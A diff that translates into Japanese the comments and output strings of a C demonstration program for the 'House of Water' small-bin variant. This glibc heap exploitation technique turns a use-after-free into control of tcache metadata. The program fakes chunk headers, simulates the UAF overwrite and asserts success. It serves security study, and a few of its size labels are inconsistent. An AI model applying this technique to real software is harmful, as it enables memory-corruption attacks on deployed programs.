@@ -3,27 +3,27 @@
 #include <assert.h>
 
 /* 
- * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a tcache
- * metadata control primitive.
+ * House of Water は、Use-After-Free (UAF) 脆弱性を tcache の
+ * メタデータ制御プリミティブ(primitive)に変換する技法です。
  *
- * Modified House of Water: This technique no longer requires 4-bit bruteforce, even if you cannot increment integers.
- * There is no need to forge a size field inside the tcache structure, as the fake chunk is linked through a small bin.
- * An article explaining this newer variant and its differences from the original House of Water can be found at:
+ * 改良版 House of Water: この技法では、整数をインクリメントできなくても、4 ビットのブルートフォース(bruteforce)はもう不要です。
+ * 偽のチャンクは small bin を通じてリンクされるため、tcache 構造体の内部で size フィールドを偽造する必要はありません。
+ * この新しい派生版と、元の House of Water との違いを解説した記事は次にあります:
  * https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/House_Of_Water_Smallbin_Variant.md
  *
- * The technique starts by allocating the 'relative chunk' immediately after tcache metadata,
- * sharing the same ASLR-partially-controlled second nibble (which is 2) as the target fake chunk location.
+ * この技法は、まず tcache のメタデータの直後に 'relative chunk' を確保することから始めます。
+ * これは、ターゲットとなる偽のチャンクの位置と、ASLR を部分的に制御できる同じ 2 番目のニブル(nibble、値は 2)を共有します。
  * 
- * Then it crafts fake tcache entries in the 0x310 & 0x320 bins using two other controlled chunks matching the 'relative chunk' size,
- * then frees all three chunks into the unsorted bin while keeping the 'relative chunk' centered.
- * A large allocation sorts them into the same small bin linked list.
+ * 次に、'relative chunk' と同じサイズの、制御できる別の 2 つのチャンクを使って、0x310 と 0x320 の bin に偽の tcache エントリを作り、
+ * 'relative chunk' を中央に保ったまま、3 つのチャンクすべてを unsorted bin に解放します。
+ * 大きな確保を行うと、それらは同じ small bin の連結リストにソートされます。
  * 
- * UAF overwrites the LSB of the 'first chunk' fd and the 'end chunk' bk pointers with 0x00, redirecting both to the fake tcache chunk on the tcache.
- * Finally, it drains the tcache; the next allocation returns the 'first chunk' from the small bin and moves remaining chunks into tcache,
- * then the second allocation returns the 'end chunk', and the final allocation returns the fake chunk for `tcache_perthread_struct` control.
+ * UAF により、'first chunk' の fd と 'end chunk' の bk ポインタの LSB を 0x00 で上書きし、どちらも tcache 上の偽の tcache チャンクに向け直します。
+ * 最後に tcache を使い切ります。次の確保で small bin から 'first chunk' が返され、残りのチャンクが tcache に移されます。
+ * その次の確保で 'end chunk' が返され、最後の確保で `tcache_perthread_struct` を制御するための偽のチャンクが返されます。
  *
- * Technique / house by @udp_ctf - Water Paddler / Blue Water 
- * Small-bin variant modified by @4f3rg4n - CyberEGGs.
+ * 技法 / house の作者: @udp_ctf - Water Paddler / Blue Water
+ * small bin 版の改良: @4f3rg4n - CyberEGGs
  */
 
 
@@ -35,10 +35,10 @@ void dump_memory(void *addr, unsigned long count) {
 }
 
 int main(void) {
-	// Dummy variable
+	// ダミー変数
 	void *_ = NULL;
 
-	// Prevent _IO_FILE from buffering in the heap
+	// _IO_FILE がヒープ内でバッファリングしないようにします
 	setbuf(stdin, NULL);
 	setbuf(stdout, NULL);
 	setbuf(stderr, NULL);
@@ -49,11 +49,11 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	puts("Very important for glibc-2.42! Now the sizeof `tcache_perthread_struct` is 0x300\n");
-	puts("Without the following heap fengshui, this technique will require 4-bit brutefoce\n\n");
+	puts("glibc-2.42 では非常に重要です! 現在 `tcache_perthread_struct` の sizeof は 0x300 です\n");
+	puts("次のヒープ風水(heap fengshui)がないと、この技法には 4 ビットのブルートフォースが必要になります\n\n");
 
-	// this heap fengshui will force the allocation of `tcache_perthread_struct` at offset 0x1f0, which is good for us
-	puts("Do free(malloc(0x1e0)) to force the misalignment of `tcache_perthread_struct`\n");
+	// このヒープ風水(heap fengshui)により、`tcache_perthread_struct` がオフセット 0x1f0 に確保されます。これは私たちに好都合です
+	puts("free(malloc(0x1e0)) を行い、`tcache_perthread_struct` を強制的にずらします\n");
 	free(malloc(0x1e0));
 
 
@@ -63,29 +63,29 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 1: Create the unsorted bins linked list, used for hijacking at a later time
+	// Step 1: 後で乗っ取りに使う、unsorted bin の連結リストを作ります
 
-	puts("Now, allocate three 0x90 chunks with guard chunks in between. This prevents");
-	puts("chunk-consolidation and sets our target for the house of water attack.");
-	puts("\t- chunks:");
+	puts("次に、間にガードチャンクを挟んで 0x90 のチャンクを 3 つ確保します。これにより");
+	puts("チャンクの統合(consolidation)が防がれ、house of water 攻撃の標的が設定されます。");
+	puts("\t- チャンク:");
 
 	void *relative_chunk = malloc(0x88);
 	printf("\t\t* relative_chunk\t@ %p\n", relative_chunk);
-	_ = malloc(0x18); // Guard chunk
+	_ = malloc(0x18); // ガードチャンク
 	
-	puts("\t\t* /guard/");
+	puts("\t\t* /ガード/");
 
 	void *small_start = malloc(0x88);
 	printf("\t\t* small_start\t@ %p\n", small_start);
-	_ = malloc(0x18); // Guard chunk
+	_ = malloc(0x18); // ガードチャンク
 	
-	puts("\t\t* /guard/");
+	puts("\t\t* /ガード/");
 
 	void *small_end = malloc(0x88);
 	printf("\t\t* small_end\t@ %p\n", small_end);
-	_ = malloc(0x18); // Guard chunk
+	_ = malloc(0x18); // ガードチャンク
 	
-	puts("\t\t* /guard/");
+	puts("\t\t* /ガード/");
 	
 	puts("");
 
@@ -96,14 +96,14 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 2: Fill up t-cache for 0x90 size class
+	// Step 2: 0x90 サイズクラスの t-cache を満たします
 	
-	// This is just to make a pointer to the t-cache metadata for later.
+	// これは、後で使うために t-cache のメタデータへのポインタを作っているだけです。
 	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff)) + 0x190;
 	printf("metadata: %p\n", metadata);
 
-	// Make allocations to free such that we can exhaust the 0x90 t-cache
-	puts("Allocate 0x10 0x88 chunks needed to fill out the 0x90 t-cache at a later time");
+	// 0x90 の t-cache を使い切れるように、解放用の確保を行います
+	puts("後で 0x90 の t-cache を満たすために必要な 0x88 のチャンクを 0x10 個確保します");
 	void *x[0x10];
 	for (int i = 0; i < 0x10; i++) {
 		x[i] = malloc(0x88);
@@ -111,10 +111,10 @@ int main(void) {
 
 	puts("");
 
-	// Free t-cache entries
-	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by free'ing them.");
-	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin");
-	puts("instead of the t-cache or small-bins.");
+	// t-cache のエントリを解放します
+	puts("先ほど確保したチャンクを free して、0x90 の t-cache を満たします。");
+	puts("こうすると、次に 0x88 のチャンクを free したとき、そのチャンクは t-cache や small-bin ではなく");
+	puts("unsorted-bin に入ります。");
 	for (int i = 0; i < 0x10; i++) {
 		free(x[i]);
 	}
@@ -125,21 +125,21 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 3: Create a 0x310 and a 0x320 t-cache entry which overlaps small_start and small_end.
-	// By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!
+	// Step 3: small_start と small_end に重なる、0x310 と 0x320 の t-cache エントリを作ります。
+	// こうすることで、t-cache のメタデータ内に FWD と BCK のポインタをブラインドで偽造できます!
 		
-	puts("Here comes the trickiest part!\n");
+	puts("ここからが最も難しい部分です!\n");
 	
-	puts("We essentially want a pointer in the 0x310 t-cache metadata to act as a FWD\n");
-	puts("pointer and a pointer in the 0x320 t-cache to act as a BCK pointer.");
-	puts("We want it such that it points to the chunk header of our small bin entries,\n");
-	puts("and not at the chunk itself which is common for t-cache.\n");
+	puts("基本的に、0x310 の t-cache メタデータ内のポインタを FWD ポインタとして、\n");
+	puts("0x320 の t-cache 内のポインタを BCK ポインタとして機能させたいのです。");
+	puts("これらが、t-cache では一般的なチャンク自体ではなく、small bin のエントリの\n");
+	puts("チャンクヘッダを指すようにしたいのです。\n");
 
-	puts("Using a technique like house of botcake or a stronger arb-free primitive, free a");
-	puts("chunk such that it overlaps with the header of unsorted_start and unsorted_end.");
+	puts("house of botcake のような技法や、より強力な任意の free のプリミティブを使って、");
+	puts("unsorted_start と unsorted_end のヘッダに重なるようにチャンクを free します。");
 	puts("");
 
-	puts("It should look like the following:");
+	puts("次のようになるはずです:");
 	puts("");
 	
 	puts("small_start:");
@@ -152,14 +152,14 @@ int main(void) {
 	dump_memory(small_end, 2);
 
 	puts("\n");
-	puts("If you want to see a blind example using only double free, see the following chal: ");
+	puts("double free だけを使ったブラインドな例を見たい場合は、次の chal を見てください: ");
 	puts("https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki");
 	puts("");
-	puts("Note: See this if you want to see the same example but with the modified House of Water version: ");
+	puts("注意: 同じ例を改良版の House of Water で見たい場合は、こちらを見てください: ");
 	puts("https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/Tamagoyaki.md");
 	puts("\n");
 
-	puts("For the sake of simplicity, let's just simulate an arbitrary free primitive.");
+	puts("簡単にするため、任意の free のプリミティブを模擬するだけにします。");
 	puts("\n");
 	
 	
@@ -169,26 +169,26 @@ int main(void) {
 	puts("\n");
 
 	// Step 3 part 1:
-	puts("Write 0x321 above small_start to enable its free'ing into the 0x320 t-cache.");
+	puts("small_start の上に 0x321 を書き込み、0x320 の t-cache に free できるようにします。");
 	printf("\t*%p-0x18 = 0x321\n", small_start);
 	*(long*)(small_start-0x18) = 0x321;
 	puts("");
 
-	puts("This creates a 0x321 entry just above small_start, which looks like the following:");
+	puts("これにより、small_start のすぐ上に 0x321 のエントリができ、次のようになります:");
 	dump_memory(small_start-0x20, 3);
 	puts("");
 
-	printf("Free the faked 0x321 chunk @ %p\n", small_start-0x10);
-	free(small_start-0x10); // Create a fake FWD
+	printf("偽の 0x321 のチャンクを free します @ %p\n", small_start-0x10);
+	free(small_start-0x10); // 偽の FWD を作ります
 	puts("");
 	
-	puts("Finally, because of the meta-data created by free'ing the 0x331 chunk, we need to");
-	puts("restore the original header of the small_start chunk by restoring the 0x91 header:");
+	puts("最後に、0x331 のチャンクを free したことで作られたメタデータのため、");
+	puts("0x91 のヘッダを書き戻して、small_start チャンクの元のヘッダを復元する必要があります:");
 	printf("\t*%p-0x8 = 0x91\n", small_start);
 	*(long*)(small_start-0x8) = 0x91;
 	puts("");
 
-	puts("Now, let's do the same for small_end except using a 0x311 faked chunk.");
+	puts("次に、small_end にも同じことを行いますが、0x311 の偽のチャンクを使います。");
 	puts("");
 
 
@@ -198,20 +198,20 @@ int main(void) {
 	puts("\n");
 
 	// Step 3 part 2:
-	puts("Write 0x311 above small_end, such that it can be free'd into the 0x320 t-cache:");
+	puts("small_end の上に 0x311 を書き込み、0x320 の t-cache に free できるようにします:");
 	printf("\t*%p-0x18 = 0x311\n", small_end);
 	*(long*)(small_end-0x18) = 0x311;
 	puts("");
 	
-	puts("This creates a 0x311 just above small_end, which looks like the following:");
+	puts("これにより、small_end のすぐ上に 0x311 ができ、次のようになります:");
 	dump_memory(small_end-0x20, 3);
 	puts("");
 	
-	printf("Free the faked 0x311 chunk @ %p\n", small_end-0x10);
-	free(small_end-0x10); // Create a fake BCK
+	printf("偽の 0x311 のチャンクを free します @ %p\n", small_end-0x10);
+	free(small_end-0x10); // 偽の BCK を作ります
 	puts("");
 	
-	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
+	puts("0x91 のヘッダを書き戻して、small_end チャンクの元のヘッダを復元します:");
 	printf("\t*%p-0x8 = 0x91\n", small_end);
 	*(long*)(small_end-0x8) = 0x91;
 	puts("");
@@ -223,10 +223,10 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 4: Create the small bin list by freeing small_start, relative_chunk, small_end into the unsorted bin,
-	// then allocate large chunk that will sort the unsorted bin into small bins.
+	// Step 4: small_start、relative_chunk、small_end を unsorted bin に解放して small bin のリストを作り、
+	// その後、unsorted bin を small bin にソートさせる大きなチャンクを確保します。
 
-	puts("Now, let's free the the chunks into the unsorted bin.");
+	puts("それでは、チャンクを unsorted bin に解放しましょう。");
 	
 	puts("\t> free(small_end);");
 	free(small_end);
@@ -239,14 +239,14 @@ int main(void) {
 	
 	puts("\n");
 
-	puts("Now allocate a large chunk to trigger the sorting of the unsorted bin entries into the small bin.");
+	puts("次に、大きなチャンクを確保して、unsorted bin のエントリを small bin にソートさせます。");
 	_ = malloc(0x700);
 
 	puts("");
 
-	// Show the setup as is	
+	// 設定をそのまま表示します
 	
-	puts("At this point, our heap looks something like this:");
+	puts("この時点で、ヒープは次のようになっています:");
 	
 	printf("\t- Small bin:\n");
 	puts("\t\tsmall_start <--> relative_chunk <--> small_end");
@@ -258,12 +258,12 @@ int main(void) {
 	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x318));
 	puts("");
 
-	puts("The fake chunk in the t-cache will look like the following:");
+	puts("t-cache 内の偽のチャンクは次のようになります:");
 	dump_memory(metadata+0x370, 4);
 	puts("");
 
-	puts("We can now observe that the 0x320 t-cache points to small_start and 0x310 t-cache points to ");
-	puts("small_end, which is what we need to fake a small-bin entry and hijack relative_chunk.");
+	puts("0x320 の t-cache が small_start を、0x310 の t-cache が ");
+	puts("small_end を指していることが確認できます。これは、small-bin のエントリを偽造して relative_chunk を乗っ取るために必要なものです。");
 
 
 	puts("\n");
@@ -272,13 +272,13 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 5: Overwrite LSB of small_start and small_end to point to the fake t-cache metadata chunk
-	puts("Finally, all there is left to do is simply overwrite the LSB of small_start FWD-");
-	puts("and BCK pointer for small_end to point to the faked t-cache metadata chunk.");
+	// Step 5: small_start と small_end の LSB を上書きして、偽の t-cache メタデータのチャンクを指すようにします
+	puts("最後に残るのは、small_start の FWD ポインタと、");
+	puts("small_end の BCK ポインタの LSB を上書きして、偽の t-cache メタデータのチャンクを指すようにすることだけです。");
 	puts("");
 
-	// Note: we simply overwrite the LSBs of small_start and small_end with a single NULL byte instead of 0x90;
-	// As a result, they point to our fake chunk in the tcache, which shares the same second-byte ASLR nibble (0x2) as the relative_chunk.
+	// 注意: small_start と small_end の LSB は、0x90 の代わりに単一のヌルバイトで上書きするだけです。
+	// その結果、それらは tcache 内の偽のチャンクを指します。この偽のチャンクは relative_chunk と ASLR の 2 バイト目のニブル (0x2) を共有しています。
 
 	/* VULNERABILITY */
 	printf("\t- small_start:\n");
@@ -293,11 +293,11 @@ int main(void) {
 	puts("");
 	/* VULNERABILITY */
 
-	puts("At this point, the small bin will look like the following:");
+	puts("この時点で、small bin は次のようになります:");
 	puts("");
 
 	puts("\t- small bin:");
-	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
+	printf("\t\t small_start <--> メタデータのチャンク <--> small_end\n");
 	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x400, small_end);
 
 	puts("\n");
@@ -306,24 +306,24 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 6: allocate to win
-	puts("Now, simply just allocate our fake chunk which is placed inside the small bin");
-	puts("But first, we need to clean the t-cache for 0x90 size class to force malloc to");
-	puts("service the allocation from the small bin.");
+	// Step 6: 確保して勝利します
+	puts("あとは、small bin の中に置かれた偽のチャンクを確保するだけです");
+	puts("ただしその前に、malloc に small bin から確保させるため、");
+	puts("0x90 サイズクラスの t-cache を空にする必要があります。");
 
 	for(int i = 0x10; i > 0; i--)
 		_ = malloc(0x88);
 
-	// Allocating small_start, and small_end again to remove them from the 0x90 t-cache bin
+	// small_start と small_end を再度確保して、0x90 の t-cache bin から取り除きます
 	_ = malloc(0x88);
 	_ = malloc(0x88);
 
 
-	// Next allocation *could* be our faked chunk!
+	// 次の確保は、偽のチャンクになる*かもしれません*!
 	void *meta_chunk = malloc(0x88);
 
-	printf("\t\tNew chunk\t @ %p\n", meta_chunk);
-	printf("\t\tt-cache metadata @ %p\n", metadata);
+	printf("\t\t新しいチャンク\t @ %p\n", meta_chunk);
+	printf("\t\tt-cache のメタデータ @ %p\n", metadata);
 	assert(meta_chunk == (metadata+0x280));
 
 	puts("");
